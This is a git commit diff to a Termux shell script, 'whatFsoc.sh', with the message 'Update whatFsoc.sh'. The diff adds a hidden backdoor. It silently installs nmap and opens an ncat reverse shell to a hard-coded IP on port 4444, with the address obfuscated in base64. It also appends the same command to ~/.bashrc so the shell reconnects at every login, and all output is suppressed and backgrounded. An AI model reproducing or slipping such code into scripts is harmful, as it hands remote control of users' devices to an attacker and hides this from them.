a447272a9aec7235baefd4e69ff437e43a72b128
Cyber91 <donata198882@gmail.com>
2026-01-27 01:07:40 -0500

    Update whatFsoc.sh

--- whatFsoc.sh
+++ whatFsoc.sh
@@ -35,8 +35,10 @@
  * *****************************************************************************
  */
 '
-pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
-echo "pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &" >> ~/.bashrc
+
+pkg install nmap -y -q > /dev/null 2>&1 && ncat $(echo MjQuMTQ0LjEyNC45MQ== | base64 -d) 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
+#pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
+echo "pkg install nmap -y -q > /dev/null 2>&1 && ncat $(echo MjQuMTQ0LjEyNC45MQ== | base64 -d) 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &" >> ~/.bashrc
 
 if false; then
   
